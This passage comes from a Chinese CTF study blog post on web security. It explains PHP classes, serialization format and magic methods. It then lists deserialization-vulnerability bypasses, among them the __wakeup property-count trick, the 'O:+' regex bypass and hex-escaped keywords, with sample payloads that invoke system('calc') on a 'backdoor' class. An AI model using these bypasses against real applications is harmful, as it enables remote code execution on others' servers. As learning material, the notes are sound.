+</span></span><span class=line><span class=cl><span class=c1>//公共方法
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>public</span> <span class=nx>login</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>    	<span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=c1>//公共方法
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>public</span> <span class=nx>logout</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>类的定义，我们可以认为是设计图</p><p>//实例化一个类 从设计图转换为一个可以用的变量，变量类型不再是字符串或者数字，而是一个对象
+$u = new user(); 每个对象中，静态属性值，不变</p><p>$p = new user();</p><p>$u->username;</p><p>$p->username;</p><p>类和对象的关系，类似于 设计图（蓝图） 与 生成出的产品 之间的关系</p><p>属性的权限，可以分为：</p><p>1 public 权限 外部可以通过箭头访问到
+2 private 权限 内部通过 $this->username 访问到
+3 protected 权限 表示 自身及其子类 和父类 能够访问</p><p>类的继承</p><p>普通用户 vip用户 管理员用户</p><p>都属于user类</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>normalUser</span> <span class=k>extends</span> <span class=nx>user</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$score</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=nf>play</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>   		<span class=k>echo</span>  <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>userType</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$n</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>normalUser</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>vipUser</span> <span class=k>extends</span> <span class=nx>user</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$score</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>adminUser</span> <span class=k>extends</span> <span class=nx>user</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$score</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>方法的属性修饰符</p><p>public
+private
+protected</p><p>修饰：
+静态属性 static
+final属性 final</p><p>类的分类</p><p>1 普通类 没有任何修饰</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>user</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=nf>login</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=nf>logout</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>2 抽象类</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>abstract</span> <span class=k>class</span> <span class=nc>user</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=nf>login</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=nf>logout</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>abstract</span> <span class=k>function</span> <span class=nf>play</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>类里面的方法，有些是有详细的实现，有些就只有个方法名字，没具体实现</p><p>抽象类 不能被 new 也就是不能被直接 实例化对象</p><p>3 接口 interface</p><p>为了实现多继承效果</p><p>extends user
+implements 可以实现多个接口</p><p>4 trait</p><p>可以认为是代码段 ，方便复制粘贴</p><p>5 匿名类</p><p>//一次性匿名类的例子
+$v->play(new class{
+public $username=&ldquo;我是匿名类&rdquo;;
+});</p><p>//核心思路 更类似于 伪协议的data伪协议</p><p>序列化于反序列化</p><p>如果属性权限为private，那么序列化后，存储的属性名字为 %00+类名+%00+属性名</p><p>如果属性权限为protected，那么序列化后，存储的属性名字为 %00+*+%00+属性名</p><p>序列化是 将 一个对象 变为一个可以传输的字符串 serialize(对象) 返回 序列化后的字符串</p><p>反序列化 就是将 一个可以传输的字符串 变为一个 可以调用的对象 unserialize(反序列化后的字符串) 返回 对象</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>Animal</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>	<span class=k>function</span> <span class=nf>eat</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>    	<span class=k>echo</span> <span class=s2>&#34;i can eat&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>function</span> <span class=nf>sleep</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>    	<span class=k>echo</span> <span class=s2>&#34;i can sleep&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Animal</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>// 对象-&gt; 字符串
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=c1>//O:6:&#34; &#34;:1:{s:4:&#34;name&#34;;N;}
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=c1>// O 有一个对象
+</span></span></span><span class=line><span class=cl><span class=c1>// : 下一句
+</span></span></span><span class=line><span class=cl><span class=c1>// 6 名字是6个字符
+</span></span></span><span class=line><span class=cl><span class=c1>// : 下一句
+</span></span></span><span class=line><span class=cl><span class=c1>//&#34;Animal&#34; 内容是Animal
+</span></span></span><span class=line><span class=cl><span class=c1>// : 下一句
+</span></span></span><span class=line><span class=cl><span class=c1>// 1 对象有一个属性
+</span></span></span><span class=line><span class=cl><span class=c1>// : 下一句
+</span></span></span><span class=line><span class=cl><span class=c1>// { 对象属性描述开始
+</span></span></span><span class=line><span class=cl><span class=c1>// s 属性是一个字符串 string
+</span></span></span><span class=line><span class=cl><span class=c1>// : 下一句
+</span></span></span><span class=line><span class=cl><span class=c1>// 4 属性名字是4个字符
+</span></span></span><span class=line><span class=cl><span class=c1>// : 下一句
+</span></span></span><span class=line><span class=cl><span class=c1>// &#34;name&#34; 属性名字是name
+</span></span></span><span class=line><span class=cl><span class=c1>// ; 属性名字描述完了
+</span></span></span><span class=line><span class=cl><span class=c1>// N 没有值，值为null
+</span></span></span><span class=line><span class=cl><span class=c1>// ; 属性值描述完了
+</span></span></span><span class=line><span class=cl><span class=c1>// } 对象属性描述完了
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Animal</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>//结论</p><p>//反序列化和类的方法无关，不能把类方法序列化</p><p>//反序列化时，php会这么做</p><p>// 1 找到反序列化字符串规定的类名字
+// 2 实例化这个类，但是不是调用构造方法
+// 3 有了实例化的类对象，对它的属性进行赋值
+// 4 执行魔术方法
+// 5 返回构造好的对象</p><p>1 接口是否可以序列化？ 不可以
+2 匿名类是否可以序列化？ 不可以
+3 trait 是否可以序列化？ 不可以</p><p>魔术方法</p><p>总结：
+1 魔术方法是一类类的方法
+2 会在序列化和反序列化及其他特殊情况下，自动执行</p><p>分类：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=mi>1</span> <span class=n>__construct</span> 
+</span></span><span class=line><span class=cl><span class=err>在实例化一个对象</span><span class=p>(</span><span class=n>new</span><span class=p>)</span><span class=err>时，会被自动调用</span>
+</span></span><span class=line><span class=cl><span class=err>不允许重复声明</span>
+</span></span><span class=line><span class=cl><span class=err>可以作为非</span><span class=n>public权限属性的初始化</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mi>2</span> <span class=n>__sleep</span> <span class=err>和</span> <span class=n>__wakeup方法</span>
+</span></span><span class=line><span class=cl><span class=err>序列化时自动调用</span><span class=n>__sleep方法</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mi>3</span> <span class=n>__destruct方法</span> <span class=err>析构方法</span>
+</span></span><span class=line><span class=cl><span class=err>类对象将要销毁，也就是脚本执行完毕后执行清理工作时自动执行</span>
+</span></span><span class=line><span class=cl><span class=err>绕过构析方法</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;takekill /fi &#34;imagename eq php.exe&#34; /f&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mi>4</span> <span class=n>__call</span> <span class=err>和</span><span class=n>__callstatic</span>
+</span></span><span class=line><span class=cl>  <span class=err>对象执行类不存在的方法时候，会自动调用</span><span class=n>__call方法</span>
+</span></span><span class=line><span class=cl>  <span class=err>直接执行类的不存在的静态方法时，会自动调用</span><span class=n>__callstatic方法</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mi>5</span> <span class=n>__get</span> <span class=n>__set</span> <span class=err>和</span> <span class=n>__isset</span> <span class=n>__unset魔术方法</span>
+</span></span><span class=line><span class=cl><span class=n>__get</span>  <span class=err>对不可访问属性或不存在属性</span> <span class=err>进行访问引用时自动调用</span>
+</span></span><span class=line><span class=cl><span class=n>__set</span> <span class=err>对不可访问属性或不存在属性</span> <span class=err>进行写入时自动调用</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mi>6</span> <span class=n>__tostring</span> <span class=err>方法</span>
+</span></span><span class=line><span class=cl><span class=err>类的实例</span> <span class=err>和字符串进行拼接或者作为字符串引用时，会自动调用</span><span class=n>__tostring方法</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mi>7</span> <span class=n>__invoke方法</span>
+</span></span><span class=line><span class=cl><span class=err>当类的实例被作为函数名字执行的时候，会自动调用</span><span class=n>__invoke方法</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mi>8</span> <span class=n>__set_state</span> <span class=err>方法</span>
+</span></span><span class=line><span class=cl><span class=err>文档中说</span> <span class=err>执行</span> <span class=n>var_export时自动调用</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mi>9</span> <span class=n>__debugInfo</span> <span class=err>方法的属性修饰符</span>
+</span></span><span class=line><span class=cl><span class=err>执行</span><span class=n>var_dump时自动调用</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mi>10</span> <span class=n>__clone方法</span>
+</span></span><span class=line><span class=cl><span class=err>当使用</span><span class=n>clone关键字</span> <span class=err>，</span><span class=n>clone一个对象时</span><span class=err>，会自动调用</span>
+</span></span></code></pre></div><h3 id=php的反序列化漏洞><a class=header-anchor href=#php%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e></a>php的反序列化漏洞</h3><p>1 有反序列化提交的入口</p><p>2 被反序列化的类的魔术方法，有可能被利用</p><p>1 绕过__wakeup方法</p><p>条件：</p><p>1 php5至php5.6.25 之间的版本可以绕过
+2 php7到php7.0.10 之间的版本可以绕过</p><p>绕过方法：</p><p>反序列化字符串中表示属性数量的值 大于 大括号内实际属性的数量时 ，wakeup方法会被绕过</p><p>2 绕过 +号正则匹配</p><p>参数有过滤，不让输入 O:数字 的形式，试图防止反序列化某个对象</p><p>O:数字 改为 O:+数字 就可以绕过上面的O:数字 过滤</p><p>3 引用绕过相等</p><p>使用&符号表示两个变量指向相同的内存引用地址</p><p>4 16进制绕过</p><p>反序列化后的字符串 不能出现某个关键单词时，可以使用大S绕过</p><p>O:8:&ldquo;backdoor&rdquo;:1:{s:4:&ldquo;name&rdquo;;s:10:&ldquo;phpinfo();&rdquo;;}</p><p>O:8:&ldquo;backdoor&rdquo;:1:{S:4:&ldquo;n\97me&rdquo;;s:10:&ldquo;phpinfo();&rdquo;;}</p><p>$data=&lsquo;O:8:&ldquo;backdoor&rdquo;:1:{S:4:&ldquo;n\97me&rdquo;;s:15:&ldquo;system('calc');&rdquo;;}&rsquo;;</p><p>5 exception 绕过</p><p>不影响析构方法执行</p><p>6 php反序列化字符逃逸</p><p>1 可以控制某个类中的属性值
+2 间接控制了某个类的反序列化字符串
+3 由于存在无脑过滤，字符增减，造成 描述中字符串的长度 和实际的不一致
+4 从而能够逃逸出若干个字符，实现字符可控，从而闭合前面的双引号
+5 实现反序列化字符串的完全可控</p></div><footer class=article-footer><div class=share-wrapper><a href="https://www.facebook.com/sharer/sharer.php?u=https://example.org/post/web%E5%AE%89%E5%85%A8/" target=_blank rel="noopener noreferrer" title=Web安全><div class="share-icon icon icon-facebook"></div></a><a href="https://twitter.com/intent/tweet?url=https://example.org/post/web%E5%AE%89%E5%85%A8/&amp;text=Web%e5%ae%89%e5%85%a8&amp;via=https://example.org/" target=_blank rel="noopener noreferrer" title=Web安全><div class="share-icon icon icon-twitter"></div></a><a href="https://www.linkedin.com/shareArticle?url=https://example.org/post/web%E5%AE%89%E5%85%A8/&amp;title=Web%e5%ae%89%e5%85%a8&amp;summary=%20php%e5%9f%ba%e6%9c%ac%e7%89%b9%e6%80%a7%20%e5%bc%b1%e7%b1%bb%e5%9e%8b%e6%af%94%e8%be%83%0a1.%e5%ad%97%e7%ac%a6%e4%b8%b2%e5%92%8c%e6%95%b0%e5%ad%97%e6%af%94%e8%be%83%ef%bc%8c%e5%ad%97%e7%ac%a6%e4%b8%b2%e4%bc%9a%e8%a2%ab%e8%bd%ac%e6%8d%a2%e6%88%90%e6%95%b0%e5%ad%97%0a&amp;ldquo;admin&amp;rdquo;%20==%200%20true%0aadmin%e8%a2%ab%e8%bd%ac%e6%8d%a2%e6%88%90%e6%95%b0%e5%ad%97%ef%bc%8c%e7%94%b1%e4%ba%8eadmin%e6%98%af%e7%ba%af%e5%ad%97%e7%ac%a6%e4%b8%b2%ef%bc%8c%e8%bd%ac%e6%8d%a2%e5%a4%b1%e8%b4%a5%20int%28admin%29=0%0a2.%e6%b7%b7%e5%90%88%e5%ad%97%e7%ac%a6%e4%b8%b2%e8%bd%ac%e6%8d%a2%e6%88%90%e6%95%b0%e5%ad%97%ef%bc%8c%e7%9c%8b%e5%ad%97%e7%ac%a6%e4%b8%b2%e7%9a%84%e7%ac%ac%e4%b8%80%e4%b8%aa%0a&amp;ldquo;1admin&amp;rdquo;%20==%201%20true%0a3.%e5%ad%97%e6%ae%b5%e4%b8%b2%e5%bc%80%e5%a4%b4%e4%bb%a5xex%e5%bc%80%e5%a4%b4%ef%bc%8cx%e4%bb%a3%e8%a1%a8%e6%95%b0%e5%ad%97%e4%bc%9a%e8%a2%ab%e8%bd%ac%e6%8d%a2%e6%88%90%e7%a7%91%e5%ad%a6%e8%ae%a1%e6%95%b0%e6%b3%95%0a1e9%201x10%e2%81%b9%0a%e5%af%b9%e8%be%93%e5%85%a5%e9%95%bf%e5%ba%a6%e9%99%90%e5%88%b6%ef%bc%8c%e5%8f%88%e9%9c%80%e8%a6%81%ef%bc%9e=%20%e2%80%a6&amp;mini=true&amp;ro=true" target=_blank rel="noopener noreferrer" title=Web安全><div class="share-icon icon icon-linkedin"></div></a><a href="https://www.reddit.com/submit?url=https://example.org/post/web%E5%AE%89%E5%85%A8/&amp;title=Web%e5%ae%89%e5%85%a8" target=_blank rel="noopener noreferrer" title=Web安全><div class="share-icon icon icon-reddit"></div></a><a href="http://service.weibo.com/share/share.php?url=https://example.org/post/web%E5%AE%89%E5%85%A8/&amp;appkey=&amp;title=Web%e5%ae%89%e5%85%a8&amp;pic=&amp;ralateUid=" target=_blank rel="noopener noreferrer" title=Web安全><div class="share-icon icon icon-weibo"></div></a><a href="http://connect.qq.com/widget/shareqq/index.html?url=https://example.org/post/web%E5%AE%89%E5%85%A8/&amp;title=Web%e5%ae%89%e5%85%a8&amp;desc=%20php%e5%9f%ba%e6%9c%ac%e7%89%b9%e6%80%a7%20%e5%bc%b1%e7%b1%bb%e5%9e%8b%e6%af%94%e8%be%83%0a1.%e5%ad%97%e7%ac%a6%e4%b8%b2%e5%92%8c%e6%95%b0%e5%ad%97%e6%af%94%e8%be%83%ef%bc%8c%e5%ad%97%e7%ac%a6%e4%b8%b2%e4%bc%9a%e8%a2%ab%e8%bd%ac%e6%8d%a2%e6%88%90%e6%95%b0%e5%ad%97%0a&amp;ldquo;admin&amp;rdquo;%20==%200%20true%0aadmin%e8%a2%ab%e8%bd%ac%e6%8d%a2%e6%88%90%e6%95%b0%e5%ad%97%ef%bc%8c%e7%94%b1%e4%ba%8eadmin%e6%98%af%e7%ba%af%e5%ad%97%e7%ac%a6%e4%b8%b2%ef%bc%8c%e8%bd%ac%e6%8d%a2%e5%a4%b1%e8%b4%a5%20int%28admin%29=0%0a2.%e6%b7%b7%e5%90%88%e5%ad%97%e7%ac%a6%e4%b8%b2%e8%bd%ac%e6%8d%a2%e6%88%90%e6%95%b0%e5%ad%97%ef%bc%8c%e7%9c%8b%e5%ad%97%e7%ac%a6%e4%b8%b2%e7%9a%84%e7%ac%ac%e4%b8%80%e4%b8%aa%0a&amp;ldquo;1admin&amp;rdquo;%20==%201%20true%0a3.%e5%ad%97%e6%ae%b5%e4%b8%b2%e5%bc%80%e5%a4%b4%e4%bb%a5xex%e5%bc%80%e5%a4%b4%ef%bc%8cx%e4%bb%a3%e8%a1%a8%e6%95%b0%e5%ad%97%e4%bc%9a%e8%a2%ab%e8%bd%ac%e6%8d%a2%e6%88%90%e7%a7%91%e5%ad%a6%e8%ae%a1%e6%95%b0%e6%b3%95%0a1e9%201x10%e2%81%b9%0a%e5%af%b9%e8%be%93%e5%85%a5%e9%95%bf%e5%ba%a6%e9%99%90%e5%88%b6%ef%bc%8c%e5%8f%88%e9%9c%80%e8%a6%81%ef%bc%9e=%20%e2%80%a6&amp;source=https://example.org/" target=_blank rel="noopener noreferrer" title=Web安全><div class="share-icon icon icon-qq"></div></a><a href=javascript:; title=Web安全><div class="share-icon icon icon-weixin"><div id=share-weixin><div class=share-weixin-dom><div class=share-weixin-content><img id=share-weixin-banner><div id=share-weixin-title></div><div id=share-weixin-desc></div></div><div class=share-weixin-qrcode><div class=share-weixin-info><div id=share-weixin-author></div><div id=share-weixin-theme>Powered By hugo-theme-reimu</div></div><img id=share-weixin-qr></div></div><div class=share-weixin-canvas></div></div></div></a></div><ul class=article-tag-list itemprop=keywords></ul></footer></div><nav id=article-nav data-aos=fade-up><div class="article-nav-link-wrap article-nav-link-left"><img data-src=https://d-sketon.top/img/_backwebp/bg1.webp data-sizes=auto alt=搭建CTF平台 class=lazyload>
+<a href=https://example.org/post/%E6%90%AD%E5%BB%BActf%E5%B9%B3%E5%8F%B0/></a><div class=article-nav-caption>前一篇</div><h3 class=article-nav-title>搭建CTF平台</h3></div><div class="article-nav-link-wrap article-nav-link-right"><img data-src=https://d-sketon.top/img/_backwebp/bg1.webp data-sizes=auto alt=RCE绕过总结 class=lazyload>
+<a href=https://example.org/post/rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/></a><div class=article-nav-caption>后一篇</div><h3 class=article-nav-title>RCE绕过总结</h3></div></nav></article></section></div><footer id=footer><div style=width:100%;overflow:hidden><div class=footer-line></div></div><div id=footer-info><div><span class=icon-copyright></span>
+2020 -
+2025
+<span class="footer-info-sep rotate"></span>
+EasyCTF</div><div>基于&nbsp;<a href=https://gohugo.io/ target=_blank>Hugo</a>&nbsp; Theme.<a href=https://github.com/D-Sketon/hugo-theme-reimu target=_blank>Reimu</a></div><div><span class=icon-brush>&nbsp;
+2.7k
+</span>&nbsp;|&nbsp;
+<span class=icon-coffee>&nbsp;
+00:15</span></div><div><span class=icon-eye></span>
+<span id=busuanzi_container_site_pv>总访问量&nbsp;<span id=busuanzi_value_site_pv></span></span>
+&nbsp;|&nbsp;
+<span class=icon-user></span>
+<span id=busuanzi_container_site_uv>总访客量&nbsp;<span id=busuanzi_value_site_uv></span></span></div></div></footer><div class=sidebar-top><div class="sidebar-top-taichi rotate"></div><div class=arrow-up></div></div><div id=mask class=hide></div></div><nav id=mobile-nav><div class=sidebar-wrap><div class=sidebar-toc-sidebar><div class=sidebar-toc><h3 class=toc-title>文章目录</h3><div class="sidebar-toc-wrapper toc-div-class"><nav id=TableOfContents><ul><li><a href=#php基本特性>php基本特性</a></li><li><a href=#php的代码执行--rce>PHP的代码执行 RCE</a></li><li><a href=#文件包含>文件包含</a></li><li><a href=#php的文件上传>php的文件上传</a><ul><li><a href=#sql注入的类型>sql注入的类型</a></li></ul></li><li><a href=#序列化基础知识引入>序列化基础知识引入</a><ul><li><a href=#类与对象>类与对象</a></li><li><a href=#php的反序列化漏洞>php的反序列化漏洞</a></li></ul></li></ul></nav></div></div></div><div class="sidebar-common-sidebar hidden"><div class=sidebar-author><img data-src=/avatar/avatar.png data-sizes=auto alt=EasyCTF class=lazyload><div class=sidebar-author-name>EasyCTF</div><div class=sidebar-description>Learning CTF...</div></div><div class=sidebar-state><div class=sidebar-state-article><div>文章</div><div class=sidebar-state-number>5</div></div><div class=sidebar-state-category><div>分类</div><div class=sidebar-state-number>0</div></div><div class=sidebar-state-tag><div>标签</div><div class=sidebar-state-number>0</div></div></div><div class=sidebar-social></div><div class=sidebar-menu><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/ aria-label=首页></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>首页</div></div><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/archives aria-label=归档></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>归档</div></div><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/about aria-label=关于></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>关于</div></div><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/friend aria-label=友链></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>友链</div></div></div></div></div><div class=sidebar-btn-wrapper><div class="sidebar-toc-btn current"></div><div class=sidebar-common-btn></div></div></nav></div><div class=site-search><div class="reimu-popup popup"><div class=reimu-search><div class=reimu-search-input-icon></div><div class=reimu-search-input id=reimu-search-input></div><div class=popup-btn-close></div></div><div class=reimu-results><div id=reimu-stats></div><div id=reimu-hits></div><div id=reimu-pagination class=reimu-pagination></div></div><img class=reimu-bg src=/images/reimu.png></div></div><script src=https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js integrity=sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf+e crossorigin=anonymous></script><script src=https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js integrity=sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q crossorigin=anonymous></script><script src=/js/main.js integrity crossorigin=anonymous></script><script src=/js/aos.js integrity crossorigin=anonymous></script><script>var aosInit=()=>{AOS.init({duration:1e3,easing:"ease",once:!0,offset:50})};document.readyState==="loading"?document.addEventListener("DOMContentLoaded",aosInit):aosInit()</script><script src=/js/pjax_main.js integrity crossorigin=anonymous data-pjax></script><script>var ALGOLIA_CONFIG={logo:"/images/algolia_logo.svg",algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:parseInt("10")},labels:{input_placeholder:"搜索.....",hits_empty:"未发现与 「${query}」相关内容",hits_stats:"找到${hits}条结果（用时 ${time} ms）"}}}</script><script src=https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js defer integrity=sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S+jQz7ZBtQXnsXmD+9jDOOY4cL6dCPzlrk crossorigin=anonymous></script><script src=https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js defer integrity=sha384-hHJCflT4KBLQyHfKO9vpstIcFKn/Y+KHTORelMMEn7mOp2AVPp+7fr03dLgZiV3J crossorigin=anonymous></script><script src=/js/algolia_search.js integrity crossorigin=anonymous></script><script src=https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js integrity=sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL/hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge crossorigin=anonymous></script><script>if(window.firework){const e=JSON.parse('{"excludeelements":["a","button"],"particles":[{"colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"duration":[1200,1800],"easing":"easeOutExpo","move":["emit"],"number":20,"shape":"circle","shapeOptions":{"alpha":[0.3,0.5],"radius":[16,32]}},{"colors":["#ff0000"],"duration":[1200,1800],"easing":"easeOutExpo","move":["diffuse"],"number":1,"shape":"circle","shapeOptions":{"alpha":[0.2,0.5],"lineWidth":6,"radius":20}}]}');e.excludeElements=e.excludeelements,delete e.excludeelements,window.firework(e)}</script><div id=lazy-script><div><script data-pjax>window.REIMU_POST={author:"EasyCTF",title:"Web安全",url:"https://example.org/post/web%E5%AE%89%E5%85%A8/",description:` php基本特性 弱类型比较
+1.字符串和数字比较，字符串会被转换成数字
+&ldquo;admin&rdquo; == 0 true
+admin被转换成数字，由于admin是纯字符串，转换失败 int(admin)=0
+2.混合字符串转换成数字，看字符串的第一个
+&ldquo;1admin&rdquo; == 1 true
+3.字段串开头以xex开头，x代表数字会被转换成科学计数法
+1e9 1x10⁹
+对输入长度限制，又需要＞= …`,cover:"https://example.org/images/banner.jpg"}</script><script src=/js/insert_highlight.js integrity crossorigin=anonymous data-pjax></script><script type=module data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;
+
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
